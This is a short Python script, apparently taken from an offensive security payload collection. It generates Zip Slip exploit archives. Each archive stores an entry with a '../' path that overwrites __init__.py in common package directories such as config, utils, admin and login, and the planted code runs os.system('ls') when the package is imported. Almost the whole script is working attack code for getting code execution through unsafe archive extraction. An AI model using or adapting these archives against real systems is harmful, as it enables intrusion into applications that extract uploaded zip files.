import zipfile
directories = ["conf", "config", "settings", "utils", "urls", "view", "tests", "scripts", "controllers", "modules", "models", "admin", "login"]
for d in directories:
    name = "python-"+d+"-__init__.py.zip"
    zipf = zipfile.ZipFile(name, 'w', zipfile.ZIP_DEFLATED)
    zipf.close()
    z_info = zipfile.ZipInfo(r"../"+d+"/__init__.py")
    z_file = zipfile.ZipFile(name, mode="w") # "/home/swissky/Bureau/"+
    z_file.writestr(z_info, "import os;print 'Shell';os.system('ls');")
    z_info.external_attr = 0o777 << 16
    z_file.close()